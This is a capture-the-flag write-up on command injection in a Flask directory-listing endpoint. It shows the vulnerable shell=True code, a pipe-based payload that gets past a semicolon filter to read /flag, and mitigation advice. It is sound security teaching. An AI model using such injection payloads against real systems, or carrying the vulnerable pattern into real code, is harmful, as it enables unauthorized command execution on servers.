# Web Security Command Injection - Level 2 Writeup

## Challenge Overview

In this level, we are presented with a simple Flask web application that exposes a GET endpoint `/quest`. This endpoint accepts a query parameter `topdir`, which is used in a shell command executed using Python’s `subprocess.run()` with `shell=True`.

The purpose of the challenge is to exploit **command injection** and retrieve the contents of the `/flag` file.

---

## Source Code Analysis

```python
@app.route("/quest", methods=["GET"])
def challenge():
    arg = flask.request.args.get("topdir", "/challenge").replace(";", "")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        encoding="latin",
    ).stdout

    return f"""<html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/quest"><input type=text name=topdir><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>"""
````

### Key Observations

* **User Input**: The input is taken from `topdir` parameter.
* **Sanitization**: The server replaces all semicolons (`;`) from the input using `.replace(";", "")`, which prevents chaining commands using `;`.
* **Shell Execution**: The input is directly used in a shell command (`ls -l`) with `shell=True`, which is inherently dangerous.

Despite blocking `;`, the developer failed to sanitize or block other shell metacharacters.

---

## Exploit Strategy

Since semicolon (`;`) is filtered, we try other shell operators:

* The **pipe character (`|`)** is a valid alternative. It allows chaining commands by passing the output of the first command as input to the second.
* In shell syntax:

  ```bash
  ls -l /challenge | cat /flag
  ```

  This command lists the contents of `/challenge` and then pipes the result into `cat /flag`. While this isn't logically useful for `cat` (since it ignores stdin when given a file), it still causes the shell to run both commands, and the **contents of `/flag` are shown**.

### URL Encoding

To send the request via a browser or `curl`, we need to URL-encode the pipe (`|`) and space characters:

* `|` → `%7C`
* space → `%20`

---

## Final Payload

```bash
curl "http://challenge.localhost/quest?topdir=/challenge%7Ccat%20/flag"
```

This results in the server running:

```bash
ls -l /challenge | cat /flag
```

And leaking the contents of `/flag`.

---

## Lessons Learned

* Never use `shell=True` with unsanitized user input.
* Filtering a single dangerous character (like `;`) is **not enough**. There are many other metacharacters that can be exploited (e.g., `|`, `&&`, backticks, `$()`, etc.).
* Proper input validation and the use of safer alternatives like `subprocess.run([...], shell=False)` with argument lists are critical.

---

## Mitigation Tips

* Avoid `shell=True` when it is not absolutely necessary.
* If shell must be used, sanitize input rigorously using whitelisting (not blacklisting).
* Consider using safe wrappers or sandboxing techniques for executing user-influenced commands.

---
